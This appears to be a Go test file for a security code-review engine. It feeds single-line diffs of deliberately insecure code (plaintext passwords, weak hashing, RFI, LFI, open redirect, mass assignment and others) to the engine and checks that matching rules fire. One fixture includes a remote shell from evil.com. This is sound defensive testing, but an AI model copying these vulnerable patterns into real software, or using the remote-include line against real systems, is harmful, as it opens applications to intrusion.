package engine

import (
	"testing"

	"github.com/Pimatis/mavetis/src/model"
	"github.com/Pimatis/mavetis/src/rule"
)

func findRuleID(findings []model.Finding, id string) *model.Finding {
	for _, f := range findings {
		if f.RuleID == id {
			return &f
		}
	}
	return nil
}

func runReview(t *testing.T, diff model.Diff) []model.Finding {
	config := model.Config{Severity: "low"}
	report, err := Review(diff, config, rule.Builtins(config))
	if err != nil {
		t.Fatalf("review failed: %v", err)
	}
	return report.Findings
}

func TestAuthPasswordPlaintext(t *testing.T) {
	findings := runReview(t, model.Diff{Files: []model.DiffFile{{
		Path: "auth.js",
		Hunks: []model.DiffHunk{{Lines: []model.DiffLine{
			{Kind: "added", Text: `if (password === req.body.password) {`, NewNumber: 1},
		}}},
	}}})
	if findRuleID(findings, "auth.password.plaintext") == nil {
		t.Fatal("expected auth.password.plaintext finding")
	}
}

func TestAuthPasswordPlaintextNegative(t *testing.T) {
	findings := runReview(t, model.Diff{Files: []model.DiffFile{{
		Path: "auth.js",
		Hunks: []model.DiffHunk{{Lines: []model.DiffLine{
			{Kind: "added", Text: `if (bcrypt.compareSync(password, hash)) {`, NewNumber: 1},
		}}},
	}}})
	if findRuleID(findings, "auth.password.plaintext") != nil {
		t.Fatal("unexpected auth.password.plaintext finding when bcrypt is present")
	}
}

func TestAuthPasswordWeakhash(t *testing.T) {
	findings := runReview(t, model.Diff{Files: []model.DiffFile{{
		Path: "auth.go",
		Hunks: []model.DiffHunk{{Lines: []model.DiffLine{
			{Kind: "added", Text: `hash := sha256.Sum256([]byte(password))`, NewNumber: 1},
		}}},
	}}})
	if findRuleID(findings, "auth.password.weakhash") == nil {
		t.Fatal("expected auth.password.weakhash finding")
	}
}

func TestAuthPasswordWeakhashNegative(t *testing.T) {
	findings := runReview(t, model.Diff{Files: []model.DiffFile{{
		Path: "auth.go",
		Hunks: []model.DiffHunk{{Lines: []model.DiffLine{
			{Kind: "added", Text: `hash, _ := bcrypt.GenerateFromPassword([]byte(password), 12)`, NewNumber: 1},
		}}},
	}}})
	if findRuleID(findings, "auth.password.weakhash") != nil {
		t.Fatal("unexpected auth.password.weakhash finding when bcrypt is present")
	}
}

func TestCryptoRsaKeysize(t *testing.T) {
	findings := runReview(t, model.Diff{Files: []model.DiffFile{{
		Path: "crypto.go",
		Hunks: []model.DiffHunk{{Lines: []model.DiffLine{
			{Kind: "added", Text: `key, _ := rsa.GenerateKey(rand.Reader, 1024)`, NewNumber: 1},
		}}},
	}}})
	if findRuleID(findings, "crypto.rsa.keysize") == nil {
		t.Fatal("expected crypto.rsa.keysize finding")
	}
}

func TestInjectRedos(t *testing.T) {
	findings := runReview(t, model.Diff{Files: []model.DiffFile{{
		Path: "validate.js",
		Hunks: []model.DiffHunk{{Lines: []model.DiffLine{
			{Kind: "added", Text: `const re = new RegExp(req.body.pattern);`, NewNumber: 1},
		}}},
	}}})
	if findRuleID(findings, "inject.redos") == nil {
		t.Fatal("expected inject.redos finding")
	}
}

func TestInjectXmlXxee(t *testing.T) {
	findings := runReview(t, model.Diff{Files: []model.DiffFile{{
		Path: "parser.py",
		Hunks: []model.DiffHunk{{Lines: []model.DiffLine{
			{Kind: "added", Text: `root = xml.etree.ElementTree.fromstring(user_input)`, NewNumber: 1},
		}}},
	}}})
	if findRuleID(findings, "inject.xml.xxee") == nil {
		t.Fatal("expected inject.xml.xxee finding")
	}
}

func TestInjectOpenredirect(t *testing.T) {
	findings := runReview(t, model.Diff{Files: []model.DiffFile{{
		Path: "server.js",
		Hunks: []model.DiffHunk{{Lines: []model.DiffLine{
			{Kind: "added", Text: `res.redirect(req.query.url);`, NewNumber: 1},
		}}},
	}}})
	if findRuleID(findings, "inject.openredirect") == nil {
		t.Fatal("expected inject.openredirect finding")
	}
}

func TestInjectLfi(t *testing.T) {
	findings := runReview(t, model.Diff{Files: []model.DiffFile{{
		Path: "server.php",
		Hunks: []model.DiffHunk{{Lines: []model.DiffLine{
			{Kind: "added", Text: `include($_GET['page']);`, NewNumber: 1},
		}}},
	}}})
	if findRuleID(findings, "inject.lfi") == nil {
		t.Fatal("expected inject.lfi finding")
	}
}

func TestInjectRfi(t *testing.T) {
	findings := runReview(t, model.Diff{Files: []model.DiffFile{{
		Path: "server.php",
		Hunks: []model.DiffHunk{{Lines: []model.DiffLine{
			{Kind: "added", Text: `include("http://evil.com/shell.php");`, NewNumber: 1},
		}}},
	}}})
	if findRuleID(findings, "inject.rfi") == nil {
		t.Fatal("expected inject.rfi finding")
	}
}

func TestFileDownloadTraversal(t *testing.T) {
	findings := runReview(t, model.Diff{Files: []model.DiffFile{{
		Path: "server.js",
		Hunks: []model.DiffHunk{{Lines: []model.DiffLine{
			{Kind: "added", Text: `res.download(req.query.filename);`, NewNumber: 1},
		}}},
	}}})
	if findRuleID(findings, "file.download.traversal") == nil {
		t.Fatal("expected file.download.traversal finding")
	}
}

func TestConfigHstsMissing(t *testing.T) {
	findings := runReview(t, model.Diff{Files: []model.DiffFile{{
		Path: "config.yaml",
		Hunks: []model.DiffHunk{{Lines: []model.DiffLine{
			{Kind: "added", Text: `hsts: false`, NewNumber: 1},
		}}},
	}}})
	if findRuleID(findings, "config.hsts.missing") == nil {
		t.Fatal("expected config.hsts.missing finding")
	}
}

func TestConfigXframeMissing(t *testing.T) {
	findings := runReview(t, model.Diff{Files: []model.DiffFile{{
		Path: "config.yaml",
		Hunks: []model.DiffHunk{{Lines: []model.DiffLine{
			{Kind: "added", Text: `xframe: false`, NewNumber: 1},
		}}},
	}}})
	if findRuleID(findings, "config.xframe.missing") == nil {
		t.Fatal("expected config.xframe.missing finding")
	}
}

func TestConfigXcontenttypeMissing(t *testing.T) {
	findings := runReview(t, model.Diff{Files: []model.DiffFile{{
		Path: "config.yaml",
		Hunks: []model.DiffHunk{{Lines: []model.DiffLine{
			{Kind: "added", Text: `disableXContentType: true`, NewNumber: 1},
		}}},
	}}})
	if findRuleID(findings, "config.xcontenttype.missing") == nil {
		t.Fatal("expected config.xcontenttype.missing finding")
	}
}

func TestLogicMassAssignment(t *testing.T) {
	findings := runReview(t, model.Diff{Files: []model.DiffFile{{
		Path: "user.js",
		Hunks: []model.DiffHunk{{Lines: []model.DiffLine{
			{Kind: "added", Text: `Object.assign(user, req.body);`, NewNumber: 1},
		}}},
	}}})
	if findRuleID(findings, "logic.mass.assignment") == nil {
		t.Fatal("expected logic.mass.assignment finding")
	}
}

func TestLogicPriceTampering(t *testing.T) {
	findings := runReview(t, model.Diff{Files: []model.DiffFile{{
		Path: "checkout.js",
		Hunks: []model.DiffHunk{{Lines: []model.DiffLine{
			{Kind: "added", Text: `const price = req.body.price;`, NewNumber: 1},
		}}},
	}}})
	if findRuleID(findings, "logic.price.tampering") == nil {
		t.Fatal("expected logic.price.tampering finding")
	}
}

func TestSecretPiiExposed(t *testing.T) {
	findings := runReview(t, model.Diff{Files: []model.DiffFile{{
		Path: "data.go",
		Hunks: []model.DiffHunk{{Lines: []model.DiffLine{
			{Kind: "added", Text: `ssn := "123-45-6789"`, NewNumber: 1},
		}}},
	}}})
	if findRuleID(findings, "secret.pii.exposed") == nil {
		t.Fatal("expected secret.pii.exposed finding")
	}
}

func TestObserveHealthdata(t *testing.T) {
	findings := runReview(t, model.Diff{Files: []model.DiffFile{{
		Path: "logger.js",
		Hunks: []model.DiffHunk{{Lines: []model.DiffLine{
			{Kind: "added", Text: `logger.info(patient.diagnosis);`, NewNumber: 1},
		}}},
	}}})
	if findRuleID(findings, "observe.healthdata") == nil {
		t.Fatal("expected observe.healthdata finding")
	}
}
